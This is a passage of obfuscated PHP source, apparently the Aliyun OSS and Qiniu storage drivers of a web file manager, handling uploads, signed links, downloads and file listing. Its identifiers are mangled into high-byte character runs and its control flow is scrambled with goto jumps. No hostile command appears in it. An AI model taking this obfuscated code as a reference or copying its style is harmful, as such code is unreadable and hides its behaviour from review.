bû§¯·‰Ùâ; CË–ƒ€âì∑: $Cˆ¬⁄ì⁄ÿ∏ = strpos($c™•≈†£ÿê, $e›Á◊Ù≤º≈[280]); $c™•≈†£ÿê = substr($c™•≈†£ÿê, 0, $Cˆ¬⁄ì⁄ÿ∏) . $e›Á◊Ù≤º≈[1197]; $Fë˜©æùÌÑ = 1048576000 * 5; goto eàÙ”ˆ◊Ç®; BÕó¶‡Œ‡è: } public function multiUploadFormData($D¡Í–›Æ∑è, $fÉùåö·◊¿ = 3600) { $C’óÖ‹√ºô =& $_SERVER[¯èãÄπµ]; if (!($e· ê∞ƒ€è = $this->getHost())) { return !1; } $FÔÉçØ«ØŒ = $this->trafficLimit($C’óÖ‹√ºô[1193]); $Fëˆ£©íÌ™ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($D¡Í–›Æ∑è), $FÔÉçØ«ØŒ); return array($C’óÖ‹√ºô[205] => $Fëˆ£©íÌ™, $C’óÖ‹√ºô[165] => $e· ê∞ƒ€è . $C’óÖ‹√ºô[8] . $this->pathEncode($D¡Í–›Æ∑è), $C’óÖ‹√ºô[206] => gmdate($C’óÖ‹√ºô[1201]), $C’óÖ‹√ºô[89] => $D¡Í–›Æ∑è); } public function multiUploadAuthData($C€≠Õ™êè, $DÑÿﬂﬁﬂàë = array()) { goto AÏ∑—·éâ’; AÏ∑—·éâ’: $Aè‘â›’√Ñ =& $_SERVER[¯èãÄπµ]; $B£çÈµ—áè = isset($DÑÿﬂﬁﬂàë[$Aè‘â›’√Ñ[206]]) ? $DÑÿﬂﬁﬂàë[$Aè‘â›’√Ñ[206]] : gmdate($Aè‘â›’√Ñ[1201]); $f∞†∂™¯©° = isset($DÑÿﬂﬁﬂàë[$Aè‘â›’√Ñ[156]]) ? $DÑÿﬂﬁﬂàë[$Aè‘â›’√Ñ[156]] : $Aè‘â›’√Ñ[33]; goto Càà√ÙÇ©é; Dã˜Í€ıØõ: if (!empty($DÑÿﬂﬁﬂàë[$Aè‘â›’√Ñ[1203]])) { $déçÿ“µŒï = array_merge(array($b˘á¨‰√å€[4]), $DÑÿﬂﬁﬂàë[$Aè‘â›’√Ñ[1203]]); sort($déçÿ“µŒï); $b˘á¨‰√å€[4] = implode($Aè‘â›’√Ñ[213], $déçÿ“µŒï); } $f¢á∞†Â¥Ö = implode($Aè‘â›’√Ñ[213], $b˘á¨‰√å€); $b¯—æ“É¡ä = base64_encode(hash_hmac($Aè‘â›’√Ñ[214], $f¢á∞†Â¥Ö, $this->secret, !0)); goto Cã–·§Œí˜; dúà±¯©åÀ: $b˘á¨‰√å€ = array($Aè‘â›’√Ñ[208], $Aè‘â›’√Ñ[33], $Aè‘â›’√Ñ[115], $B£çÈµ—áè, "\170\55\157\163\163\55\144\141\164\x65\x3a{$B£çÈµ—áè}", $Aè‘â›’√Ñ[8] . $this->bucket . $Aè‘â›’√Ñ[8] . $Cæ¶—‡Ê«Æ . $f∞†∂™¯©°); if (strpos($f∞†∂™¯©°, $Aè‘â›’√Ñ[209]) === 0) { $b˘á¨‰√å€[0] = $Aè‘â›’√Ñ[210]; if ($cÙ§Ï©≈Ö’ = $this->trafficLimit($Aè‘â›’√Ñ[1193])) { $Cæ¶—‡Ê«Æ = $Aè‘â›’√Ñ[1202]; array_splice($b˘á¨‰√å€, 5, 0, $Cæ¶—‡Ê«Æ . $Aè‘â›’√Ñ[4] . $cÙ§Ï©≈Ö’[$Cæ¶—‡Ê«Æ]); } } if (isset($DÑÿﬂﬁﬂàë[$Aè‘â›’√Ñ[211]]) && $DÑÿﬂﬁﬂàë[$Aè‘â›’√Ñ[211]] == $Aè‘â›’√Ñ[212]) { $b˘á¨‰√å€[0] = $Aè‘â›’√Ñ[212]; } goto Dã˜Í€ıØõ; Càà√ÙÇ©é: $Cæ¶—‡Ê«Æ = $C€≠Õ™êè; if (isset($DÑÿﬂﬁﬂàë[$Aè‘â›’√Ñ[89]])) { $Cæ¶—‡Ê«Æ = $DÑÿﬂﬁﬂàë[$Aè‘â›’√Ñ[89]]; unset($DÑÿﬂﬁﬂàë[$Aè‘â›’√Ñ[89]]); } if (isset($DÑÿﬂﬁﬂàë[$Aè‘â›’√Ñ[207]])) { $DÑÿﬂﬁﬂàë[$Aè‘â›’√Ñ[206]] = $B£çÈµ—áè; return $this->listUploadParts($Cæ¶—‡Ê«Æ, $DÑÿﬂﬁﬂàë); } goto dúà±¯©åÀ; Cã–·§Œí˜: $bî∂ï«¡∑¡ = $Aè‘â›’√Ñ[1204] . $this->accessKey . $Aè‘â›’√Ñ[4] . $b¯—æ“É¡ä; if (strpos($f∞†∂™¯©°, $Aè‘â›’√Ñ[209]) === 0) { $bî∂ï«¡∑¡ = array($Aè‘â›’√Ñ[216] => $bî∂ï«¡∑¡, $Aè‘â›’√Ñ[206] => $B£çÈµ—áè); if ($cÙ§Ï©≈Ö’) { $bî∂ï«¡∑¡ = array_merge($bî∂ï«¡∑¡, $cÙ§Ï©≈Ö’); } } return $bî∂ï«¡∑¡; goto A±‰¨È¯‚ò; A±‰¨È¯‚ò: } public function listUploadParts($D¿Ù‰‚‹≈¥, $fôÙ®ìá≥·) { goto dù´¬›éÉﬁ; dù´¬›éÉﬁ: $E´≈˜·ˆı≤ =& $_SERVER[¯èãÄπµ]; $aï©®»ùå¯ = parse_url_query($fôÙ®ìá≥·[$E´≈˜·ˆı≤[156]]); $A√¬ÓŒÊã± = $this->client->listParts($this->bucket, $this->pathEncode($D¿Ù‰‚‹≈¥), $aï©®»ùå¯[$E´≈˜·ˆı≤[205]]); goto e»úÍèØÂ¬; Bä∞áå’ªÏ: return array($E´≈˜·ˆı≤[216] => $Cù€ˆ√◊≈•, $E´≈˜·ˆı≤[206] => $fôÙ®ìá≥·[$E´≈˜·ˆı≤[206]], $E´≈˜·ˆı≤[218] => $c©ŸËµ¥èœ); goto dñ†•≥ﬁ“º; e»úÍèØÂ¬: $BÌ«¥≥Èã = $A√¬ÓŒÊã±->getListPart(); $c©ŸËµ¥èœ = array(); foreach ($BÌ«¥≥Èã as $c®ËëùÑÈ) { $c©ŸËµ¥èœ[] = array($E´≈˜·ˆı≤[1184] => $c®ËëùÑÈ->getPartNumber(), $E´≈˜·ˆı≤[1185] => trim($c®ËëùÑÈ->getETag(), $E´≈˜·ˆı≤[112])); } goto F™óàãÍ◊π; F™óàãÍ◊π: unset($fôÙ®ìá≥·[$E´≈˜·ˆı≤[207]], $fôÙ®ìá≥·[$E´≈˜·ˆı≤[211]]); $Cù€ˆ√◊≈• = $this->multiUploadAuthData($D¿Ù‰‚‹≈¥, $fôÙ®ìá≥·); if (empty($Cù€ˆ√◊≈•)) { return !1; } goto Bä∞áå’ªÏ; dñ†•≥ﬁ“º: } public function download($b‹‡íö‡Õ›, $FÚ±ßèóÁ‚) { if ($this->isFolder($b‹‡íö‡Õ›)) { return !1; } try { $dÿ∞√Ñ∂Üı = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $FÚ±ßèóÁ‚); $dÿ∞√Ñ∂Üı = $this->trafficLimit($_SERVER[¯èãÄπµ][104], $dÿ∞√Ñ∂Üı); $this->client->getObject($this->bucket, $this->pathEncode($b‹‡íö‡Õ›), $dÿ∞√Ñ∂Üı); } catch (OSS\Core\OssException $c¬ñƒµÈ±á) { return !1; } return $FÚ±ßèóÁ‚; } public function fileSubstr($Aé¬Æµœ‚≥, $CûüÔ‘‰∂∂ = 0, $c„◊ ëº—ÿ = false) { if ($CûüÔ‘‰∂∂ === -1) { $BÕí∞ıûΩ = array(); } else { if ($c„◊ ëº—ÿ === !1) { $aÎ∑ªÔÛ†è = $this->size($Aé¬Æµœ‚≥); } else { $aÎ∑ªÔÛ†è = $CûüÔ‘‰∂∂ + $c„◊ ëº—ÿ - 1; } $BÕí∞ıûΩ = array(OSS\OssClient::OSS_RANGE => "{$CûüÔ‘‰∂∂}\x2d{$aÎ∑ªÔÛ†è}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($Aé¬Æµœ‚≥), $BÕí∞ıûΩ); } catch (OSS\Core\OssException $bî∏¨ŒóÁõ) { think_exception($bî∏¨ŒóÁõ->getMessage()); return !1; } } private function trafficLimit($Bﬁ ’æ™ÙÔ, $d≈Ÿ•˘» = array()) { goto A√‚µ±ËÇÓ; D¥•ÇÏå‹¶: return $d≈Ÿ•˘»; goto F‰°Ù∏È÷√; A√‚µ±ËÇÓ: $fÛ€áﬁÍÍ◊ =& $_SERVER[¯èãÄπµ]; if ($Bﬁ ’æ™ÙÔ == $fÛ€áﬁÍÍ◊[1193] && $this->isUploadServer() || $Bﬁ ’æ™ÙÔ == $fÛ€áﬁÍÍ◊[104] && $this->isFileOutServer()) { return $d≈Ÿ•˘»; } $A¡â‚úÓ≤≥ = floatval($GLOBALS[$fÛ€áﬁÍÍ◊[6]][$fÛ€áﬁÍÍ◊[84]][$fÛ€áﬁÍÍ◊[102]][$Bﬁ ’æ™ÙÔ]) * 1024 * 1024 * 8; goto bﬂ«π“ö≤â; bﬂ«π“ö≤â: if (!$A¡â‚úÓ≤≥) { return $d≈Ÿ•˘»; } $A¡â‚úÓ≤≥ = $A¡â‚úÓ≤≥ < 819200 ? 819200 : ($A¡â‚úÓ≤≥ > 838860800 ? 838860800 : $A¡â‚úÓ≤≥); $d≈Ÿ•˘»[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($A¡â‚úÓ≤≥); goto D¥•ÇÏå‹¶; F‰°Ù∏È÷√: } public function link($EÈì“ã—ŸË, $bé˜ºî∞Ωº = array()) { $aáΩ¨ÚäâÆ =& $_SERVER[¯èãÄπµ]; if (!$this->exist($EÈì“ã—ŸË) || $this->isFolder($EÈì“ã—ŸË)) { return !1; } try { $bé˜ºî∞Ωº = $this->trafficLimit($aáΩ¨ÚäâÆ[104], $bé˜ºî∞Ωº); $açöÕ»Òˆñ = $this->client->signUrl($this->bucket, $this->pathEncode($EÈì“ã—ŸË), 3600 * 12, $aáΩ¨ÚäâÆ[212], $bé˜ºî∞Ωº); return $this->getCdnLink($açöÕ»Òˆñ); } catch (OSS\Core\OssException $C°‹õ™»—˜) { return !1; } } public function fileOut($Aì÷∫∂Éî‘, $a®≤ó≈Íê– = false, $DÏèŒ√Œ¨∫ = false, $b€Ñã¡Ωœ = '') { goto dô”öÉ¡–Ω; d°Ü≠©€–Ÿ: $bΩ©æÑó÷£ = get_file_mime(get_path_ext($DÏèŒ√Œ¨∫)); if ($bΩ©æÑó÷£ == $A¡Õ∫é®ü®[197]) { return parent::fileOut($Aì÷∫∂Éî‘, $a®≤ó≈Íê–, $DÏèŒ√Œ¨∫, $b€Ñã¡Ωœ); } $a®≤ó≈Íê– = $a®≤ó≈Íê– ? $A¡Õ∫é®ü®[198] : $A¡Õ∫é®ü®[199]; goto e∞ññë≤…∆; e∞ññë≤…∆: $D¯’£ãùÖÚ = array(OSS\OssClient::OSS_SUB_RESOURCE => $A¡Õ∫é®ü®[1205] . rawurlencode("{$a®≤ó≈Íê–}\x3b\x66\x69\x6c\x65\156\x61\x6d\145\x3d{$DÏèŒ√Œ¨∫}")); $D¯’£ãùÖÚ[OSS\OssClient::OSS_SUB_RESOURCE] .= $A¡Õ∫é®ü®[1206] . rawurlencode($bΩ©æÑó÷£); $bˆÒËŸ«Ç« = $this->link($Aì÷∫∂Éî‘, $D¯’£ãùÖÚ); goto bΩê∞À ïÂ; bΩê∞À ïÂ: $this->fileOutLink($bˆÒËŸ«Ç«); goto B¬é°Æ‹∂ª; dô”öÉ¡–Ω: $A¡Õ∫é®ü® =& $_SERVER[¯èãÄπµ]; if (!$DÏèŒ√Œ¨∫) { $DÏèŒ√Œ¨∫ = $this->pathThis($Aì÷∫∂Éî‘); } $DÏèŒ√Œ¨∫ = rawurlencode($DÏèŒ√Œ¨∫); goto d°Ü≠©€–Ÿ; B¬é°Æ‹∂ª: } public function fileOutServer($cÁ¢∏áπÿ≤, $c—◊Òµ≥€æ = false, $BöÓ•¬î≥£ = false, $aéÎ≤ïä∞û = '') { parent::fileOut($cÁ¢∏áπÿ≤, $c—◊Òµ≥€æ, $BöÓ•¬î≥£, $aéÎ≤ïä∞û); } public function fileOutImage($AÎ‹ã◊≈¬Ú, $D‰‰¢ﬂÿûõ = 250) { $cÉººÀ—µ≤ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[¯èãÄπµ][1207] . $D‰‰¢ﬂÿûõ); $Aö‘≤≠ñ≥Ï = $this->link($AÎ‹ã◊≈¬Ú, $cÉººÀ—µ≤); $this->fileOutLink($Aö‘≤≠ñ≥Ï); } public function fileOutImageServer($a€ç“≈ΩÔÂ, $D´≈∞•èìÙ = 250) { parent::fileOutImage($a€ç“≈ΩÔÂ, $D´≈∞•èìÙ); } public function fileOutLink($aπıã—ãç) { $B≤úÕﬁ°å´ =& $_SERVER[¯èãÄπµ]; if (!$this->isCdnHost() && substr($aπıã—ãç, 0, 7) == $B≤úÕﬁ°å´[1110]) { $aπıã—ãç = $B≤úÕﬁ°å´[1111] . substr($aπıã—ãç, 7); } header($B≤úÕﬁ°å´[152] . $aπıã—ãç); die; } public function hashMd5($Fˆ›Óã»äÇ, $dÛå¥¨Îçˆ = '') { $dª◊çÎﬁªÃ =& $_SERVER[¯èãÄπµ]; $A≤ƒÆ‰ç¶Ç = $this->objectMeta($Fˆ›Óã»äÇ); if (!$A≤ƒÆ‰ç¶Ç) { return $dª◊çÎﬁªÃ[33]; } if (!isset($A≤ƒÆ‰ç¶Ç[$dª◊çÎﬁªÃ[1180]]) && !empty($dÛå¥¨Îçˆ)) { $f¶Ù¨®ê°Ã = $this->updateObjMeta($Fˆ›Óã»äÇ, array($dª◊çÎﬁªÃ[1180] => $dÛå¥¨Îçˆ)); $A≤ƒÆ‰ç¶Ç[$dª◊çÎﬁªÃ[1180]] = $f¶Ù¨®ê°Ã ? $dÛå¥¨Îçˆ : $dª◊çÎﬁªÃ[33]; } return isset($A≤ƒÆ‰ç¶Ç[$dª◊çÎﬁªÃ[1180]]) ? strtolower($A≤ƒÆ‰ç¶Ç[$dª◊çÎﬁªÃ[1180]]) : $dª◊çÎﬁªÃ[33]; } public function size($CÁÇ ë÷÷ ) { $B√å‰‡ÇæÊ = $this->objectMeta($CÁÇ ë÷÷ ); return $B√å‰‡ÇæÊ ? $B√å‰‡ÇæÊ[$_SERVER[¯èãÄπµ][77]] : 0; } public function info($aÖÇ⁄ÿÍÏ¿) { if ($this->isFolder($aÖÇ⁄ÿÍÏ¿)) { return $this->folderInfo($aÖÇ⁄ÿÍÏ¿); } else { if ($this->isFile($aÖÇ⁄ÿÍÏ¿)) { return $this->fileInfo($aÖÇ⁄ÿÍÏ¿); } } return !1; } public function exist($FëÎò⁄µñ∆) { return $this->isFile($FëÎò⁄µñ∆) || $this->isFolder($FëÎò⁄µñ∆); } public function isFile($Eà—éÌ·ﬁï) { return !$this->isFolder($Eà—éÌ·ﬁï) && $this->objectMeta($Eà—éÌ·ﬁï); } public function isFolder($f©¨ù †Ãá) { return $this->cacheMethod($_SERVER[¯èãÄπµ][219], $f©¨ù †Ãá); } protected function objectMeta($C´è»◊¶À«) { return $this->cacheMethod($_SERVER[¯èãÄπµ][220], $C´è»◊¶À«); } protected function _objectMeta($E◊ì⁄Â∆öÔ) { $aßä®∑Â–Á =& $_SERVER[¯èãÄπµ]; try { $Fûò÷ƒóí† = $this->client->getObjectMeta($this->bucket, $this->pathEncode($E◊ì⁄Â∆öÔ)); } catch (OSS\Core\OssException $cë°ï¡∞˜ë) { $Fûò÷ƒóí† = !1; } if ($Fûò÷ƒóí†) { $Fûò÷ƒóí†[$aßä®∑Â–Á[77]] = intval($Fûò÷ƒóí†[$aßä®∑Â–Á[1187]]); } return $Fûò÷ƒóí†; } protected function _isFolder($F‚÷á»‡≤ª) { $D∑†©öîñÑ =& $_SERVER[¯èãÄπµ]; if ($F‚÷á»‡≤ª == $D∑†©öîñÑ[33] || $F‚÷á»‡≤ª == $D∑†©öîñÑ[8]) { return !0; } $EÖ◊Õ¶úÚÊ = array($D∑†©öîñÑ[1177] => $D∑†©öîñÑ[8], $D∑†©öîñÑ[182] => rtrim($F‚÷á»‡≤ª, $D∑†©öîñÑ[8]) . $D∑†©öîñÑ[8], $D∑†©öîñÑ[1178] => 1, $D∑†©öîñÑ[1179] => $D∑†©öîñÑ[33]); $aŒÁØıöôÉ = $this->client->listObjects($this->bucket, $EÖ◊Õ¶úÚÊ); if ($aŒÁØıöôÉ->getObjectList() || $aŒÁØıöôÉ->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public function __construct($AÔü≈ÂºË£) { parent::__construct(); require_once SDK_DIR . $_SERVER[¯èãÄπµ][1208]; $this->_init($AÔü≈ÂºË£); } public function _init($FÜ´∂†ïêÑ) { foreach ($FÜ´∂†ïêÑ as $F‰◊É¶”ú => $b§ê◊‘·∏œ) { if (isset($this->{$F‰◊É¶”ú})) { $this->{$F‰◊É¶”ú} = $b§ê◊‘·∏œ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[¯èãÄπµ][1209], !1); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($FﬁàŒÑÖï€, $A®Õ‡°ß©Ö = '', $B◊ÔñÍåã∏ = REPEAT_RENAME) { if ($this->setContent($FﬁàŒÑÖï€, $A®Õ‡°ß©Ö)) { return $this->getPathOuter($FﬁàŒÑÖï€); } return !1; } public function mkdir($eßçç∞Ü∑⁄, $EÈ¢ÒëÇÿ≥ = REPEAT_SKIP) { goto d°÷âÚ¿Òß; d°÷âÚ¿Òß: $F€ø⁄ä°≠ñ =& $_SERVER[¯èãÄπµ]; $Dé¬ÙË¡Üä = trim($eßçç∞Ü∑⁄, $F€ø⁄ä°≠ñ[8]); if ($this->_isFolder($Dé¬ÙË¡Üä)) { return $this->getPathOuter($Dé¬ÙË¡Üä); } goto F†¨Ñ¥Ò®û; F†¨Ñ¥Ò®û: $eßçç∞Ü∑⁄ = $Dé¬ÙË¡Üä . $F€ø⁄ä°≠ñ[8]; $cùÇƒ©¥Œó = get_path_this($Dé¬ÙË¡Üä); $eãäÆÕƒô© = $eßçç∞Ü∑⁄ . $cùÇƒ©¥Œó; goto E´ª·∏éäˆ; E´ª·∏éäˆ: if (!$this->mkfile($eãäÆÕƒô©)) { return !1; } if (!$this->moveFile($eãäÆÕƒô©, $eßçç∞Ü∑⁄)) { $this->delFile($eãäÆÕƒô©); return !1; } return $this->getPathOuter($Dé¬ÙË¡Üä); goto F⁄⁄Á≥‡∏£; F⁄⁄Á≥‡∏£: } public function copyFile($bøÏ†…’éö, $fÊí»ÚËÖ£) { $b¿è∏ΩïÍÍ = $this->bucketManager->copy($this->bucket, $bøÏ†…’éö, $this->bucket, $fÊí»ÚËÖ£, !0); return $b¿è∏ΩïÍÍ ? !1 : !0; } public function moveFile($b≥·¬Àº·â, $aÌ±êàëΩÏ) { $aêÇãÂ≤ßÿ = $this->bucketManager->move($this->bucket, $b≥·¬Àº·â, $this->bucket, $aÌ±êàëΩÏ, !0); return $aêÇãÂ≤ßÿ ? !1 : !0; } public function delFile($aº∏ÈÎÚëÚ) { $FÿøÚæàÁ§ = $this->bucketManager->delete($this->bucket, $aº∏ÈÎÚëÚ); return $FÿøÚæàÁ§ ? !1 : !0; } public function delFolder($FÈÁóë•ΩÓ) { $e‰ÇÑŒàŸ⁄ = $this->fileList($FÈÁóë•ΩÓ); if (empty($e‰ÇÑŒàŸ⁄)) { return !0; } $Fä≈Ò‹åÜ  = 1000; if (count($e‰ÇÑŒàŸ⁄) <= $Fä≈Ò‹åÜ ) { return $this->qnDelObj($e‰ÇÑŒàŸ⁄) ? !1 : !0; } foreach (array_chunk($e‰ÇÑŒàŸ⁄, $Fä≈Ò‹åÜ ) as $dœëÌπÇ¥È) { $CÌ∏Üäú…≤ = $this->qnDelObj($dœëÌπÇ¥È); if ($CÌ∏Üäú…≤) { return !1; } } return !0; } private function qnDelObj($c§Ö∑ßèÚœ) { $FıèÙÖ‡¬∑ = $this->bucketManager->buildBatchDelete($this->bucket, $c§Ö∑ßèÚœ); list($E‹º®∑è÷, $aáÑœ∑í∆£) = $this->bucketManager->batch($FıèÙÖ‡¬∑); return $aáÑœ∑í∆£; } private function fileList($féîõ±˜õÜ, $A∑·ÉÎÉŒÖ = 0) { goto Bà÷¿√”Öº; fÏàöÏ“ìé: $a‚‡ÜüÙú¢ = $F–Õ„ÛÑÃä[33]; $EØ∞Ñ’˜çô = 1000; $a÷∫áûê¨™ = $F–Õ„ÛÑÃä[33]; goto fªé¬÷è≥ü; Bà÷¿√”Öº: $F–Õ„ÛÑÃä =& $_SERVER[¯èãÄπµ]; $féîõ±˜õÜ = trim($féîõ±˜õÜ, $F–Õ„ÛÑÃä[8]); $a¥åÃÒÎ◊Î = empty($féîõ±˜õÜ) ? $F–Õ„ÛÑÃä[33] : $féîõ±˜õÜ . $F–Õ„ÛÑÃä[8]; goto fÏàöÏ“ìé; fªé¬÷è≥ü: $CÒœ®ˆŸ®ñ = array(); while (!0) { list($BŸ¶ ◊ ©â, $C≤Î¶âÛ∆á) = $this->bucketManager->listFiles($this->bucket, $a¥åÃÒÎ◊Î, $a‚‡ÜüÙú¢, $EØ∞Ñ’˜çô, $a÷∫áûê¨™); if ($C≤Î¶âÛ∆á) { return !1; } $a‚‡ÜüÙú¢ = array_key_exists($F–Õ„ÛÑÃä[1179], $BŸ¶ ◊ ©â) ? $a‚‡ÜüÙú¢ = $BŸ¶ ◊ ©â[$F–Õ„ÛÑÃä[1210]] : $F–Õ„ÛÑÃä[33]; foreach ($BŸ¶ ◊ ©â[$F–Õ„ÛÑÃä[1211]] as $e€Ïˆå¢§≈) { $D¨§√Ö•ùƒ = $e€Ïˆå¢§≈[$F–Õ„ÛÑÃä[89]]; if ($A∑·ÉÎÉŒÖ) { $D¨§√Ö•ùƒ = array($F–Õ„ÛÑÃä[28] => $D¨§√Ö•ùƒ, $F–Õ„ÛÑÃä[77] => $e€Ïˆå¢§≈[$F–Õ„ÛÑÃä[1212]]); } $CÒœ®ˆŸ®ñ[] = $D¨§√Ö•ùƒ; } if ($a‚‡ÜüÙú¢ == $F–Õ„ÛÑÃä[33]) { break; } } return $CÒœ®ˆŸ®ñ; goto FøÙŸåËπÇ; FøÙŸåËπÇ: } public function rename($fŒ⁄®•éäã, $BŸÜŒ“ú€Ö) { return $this->renameObject($fŒ⁄®•éäã, $BŸÜŒ“ú€Ö); } public function fileInfo($DùèàÎ´Çπ, $dé•≤‰ŸÌ• = false, $d◊Ó¶âÛŒº = array()) { goto Cì¨Âãˆπÿ; Fá•œô∏ü¿: if (empty($d◊Ó¶âÛŒº)) { $d◊Ó¶âÛŒº = $this->objectMeta($DùèàÎ´Çπ); if (!$d◊Ó¶âÛŒº) { return $Fû≥îâŸÚÖ; } } if (isset($d◊Ó¶âÛŒº[$B‚¥™„ááö[1213]])) { $Fû≥îâŸÚÖ[$B‚¥™„ááö[183]] = $d◊Ó¶âÛŒº[$B‚¥™„ááö[1213]]; } if (isset($d◊Ó¶âÛŒº[$B‚¥™„ááö[1212]])) { $Fû≥îâŸÚÖ[$B‚¥™„ááö[77]] = $d◊Ó¶âÛŒº[$B‚¥™„ááö[1212]]; } goto d√âØÔêÖπ; Cì¨Âãˆπÿ: $B‚¥™„ááö =& $_SERVER[¯èãÄπµ]; if ($dé•≤‰ŸÌ•) { return array($B‚¥™„ááö[28] => $this->pathThis($DùèàÎ´Çπ), $B‚¥™„ááö[75] => $this->getPathOuter($B‚¥™„ááö[8] . $DùèàÎ´Çπ), $B‚¥™„ááö[29] => $B‚¥™„ááö[163], $B‚¥™„ááö[77] => isset($d◊Ó¶âÛŒº[$B‚¥™„ááö[1212]]) ? $d◊Ó¶âÛŒº[$B‚¥™„ááö[1212]] : 0, $B‚¥™„ááö[156] => $this->ext($DùèàÎ´Çπ)); } $Fû≥îâŸÚÖ = array($B‚¥™„ááö[28] => $this->pathThis($DùèàÎ´Çπ), $B‚¥™„ááö[75] => $this->getPathOuter($B‚¥™„ááö[8] . $DùèàÎ´Çπ), $B‚¥™„ááö[29] => $B‚¥™„ááö[163], $B‚¥™„ááö[183] => 0, $B‚¥™„ááö[106] => 0, $B‚¥™„ááö[77] => 0, $B‚¥™„ááö[156] => $this->ext($DùèàÎ´Çπ), $B‚¥™„ááö[184] => !0, $B‚¥™„ááö[185] => !0); goto Fá•œô∏ü¿; d√âØÔêÖπ: return $Fû≥îâŸÚÖ; goto aÈåÑÉÍ¬·; aÈåÑÉÍ¬·: } public function folderInfo($BùÖ¡±§õ , $CìÖ«ÌËÖ = false) { goto fäáá⁄à¯Ê; a∞ú¨¡öûÖ: $BùÖ¡±§õ  = rtrim($BùÖ¡±§õ , $Fûäﬂ¿ø€[8]) . $Fûäﬂ¿ø€[8]; $A„‘¶É¢ºÃ = $this->objectMeta($BùÖ¡±§õ ); if (isset($A„‘¶É¢ºÃ[$Fûäﬂ¿ø€[1213]])) { $A«Êä›ëÊò[$Fûäﬂ¿ø€[183]] = $A„‘¶É¢ºÃ[$Fûäﬂ¿ø€[1213]]; } goto E∞Í†£Œ÷·; E∞Í†£Œ÷·: return $A«Êä›ëÊò; goto e™’…È÷éä; fäáá⁄à¯Ê: $Fûäﬂ¿ø€ =& $_SERVER[¯èãÄπµ]; if ($CìÖ«ÌËÖ) { return array($Fûäﬂ¿ø€[28] => $this->pathThis($BùÖ¡±§õ ), $Fûäﬂ¿ø€[75] => $this->getPathOuter($Fûäﬂ¿ø€[8] . $BùÖ¡±§õ ), $Fûäﬂ¿ø€[29] => $Fûäﬂ¿ø€[76]); } $A«Êä›ëÊò = array($Fûäﬂ¿ø€[28] => $this->pathThis($BùÖ¡±§õ ), $Fûäﬂ¿ø€[75] => $this->getPathOuter($Fûäﬂ¿ø€[8] . $BùÖ¡±§õ ), $Fûäﬂ¿ø€[29] => $Fûäﬂ¿ø€[76], $Fûäﬂ¿ø€[183] => 0, $Fûäﬂ¿ø€[106] => 0, $Fûäﬂ¿ø€[1156] => !0, $Fûäﬂ¿ø€[1157] => !0); goto a∞ú¨¡öûÖ; e™’…È÷éä: } public function listPath($aÌÊÂ¬®≥Â, $BíõÌÈµ©á = false) { goto aÖ¬ÍﬂéÏ˜; aÖ¬ÍﬂéÏ˜: $a·Îù‡⁄Ö— =& $_SERVER[¯èãÄπµ]; $aÌÊÂ¬®≥Â = trim($aÌÊÂ¬®≥Â, $a·Îù‡⁄Ö—[8]); $c–◊∞©‘àã = empty($aÌÊÂ¬®≥Â) ? $a·Îù‡⁄Ö—[33] : $aÌÊÂ¬®≥Â . $a·Îù‡⁄Ö—[8]; goto EÜÏïÏéÑ’; EÜÏïÏéÑ’: $Cà‘Í„÷± = $a·Îù‡⁄Ö—[33]; $d˜ﬁΩâïî¥ = 1000; $cæêı∏√∏û = $a·Îù‡⁄Ö—[8]; goto FªËëíæÖÒ; FªËëíæÖÒ: $f¥ŸúúçõÙ = $f¶¶ﬁ›±Ó‰ = array(); while (!0) { list($D∏Î»è©èΩ, $D”¨Çı†ºí) = $this->bucketManager->listFiles($this->bucket, $c–◊∞©‘àã, $Cà‘Í„÷±, $d˜ﬁΩâïî¥, $cæêı∏√∏û); if ($D”¨Çı†ºí) { return !1; } $Cà‘Í„÷± = array_key_exists($a·Îù‡⁄Ö—[1179], $D∏Î»è©èΩ) ? $Cà‘Í„÷± = $D∏Î»è©èΩ[$a·Îù‡⁄Ö—[1210]] : $a·Îù‡⁄Ö—[33]; if (isset($D∏Î»è©èΩ[$a·Îù‡⁄Ö—[1214]])) { foreach ($D∏Î»è©èΩ[$a·Îù‡⁄Ö—[1214]] as $Cé€í´‹çñ) { if ($Cé€í´‹çñ == $c–◊∞©‘àã) { continue; } $f¥ŸúúçõÙ[] = $this->folderInfo($Cé€í´‹çñ, $BíõÌÈµ©á); } } if (isset($D∏Î»è©èΩ[$a·Îù‡⁄Ö—[1211]])) { foreach ($D∏Î»è©èΩ[$a·Îù‡⁄Ö—[1211]] as $DËÉŒ⁄Âã˘) { if ($DËÉŒ⁄Âã˘[$a·Îù‡⁄Ö—[89]] == $c–◊∞©‘àã) { continue; } $f¶¶ﬁ›±Ó‰[] = $this->fileInfo($DËÉŒ⁄Âã˘[$a·Îù‡⁄Ö—[89]], $BíõÌÈµ©á, $DËÉŒ⁄Âã˘); } } if ($Cà‘Í„÷± == $a·Îù‡⁄Ö—[33]) { break; } } return array($a·Îù‡⁄Ö—[74] => $f¥ŸúúçõÙ, $a·Îù‡⁄Ö—[73] => $f¶¶ﬁ›±Ó‰); goto eﬁÉô…Øí◊; eﬁÉô…Øí◊: } public function has($fƒú˘ßÊ¶‹, $Dƒı⁄ä·∆ã = false, $Eº¯ƒïŸﬁá = true) { goto d“ÇÒ·§ßâ; d“ÇÒ·§ßâ: $Då´“ñ‘ãÏ =& $_SERVER[¯èãÄπµ]; $fƒú˘ßÊ¶‹ = trim($fƒú˘ßÊ¶‹, $Då´“ñ‘ãÏ[8]); $aìÃ§àÁâÀ = empty($fƒú˘ßÊ¶‹) ? $Då´“ñ‘ãÏ[33] : $fƒú˘ßÊ¶‹ . $Då´“ñ‘ãÏ[8]; goto 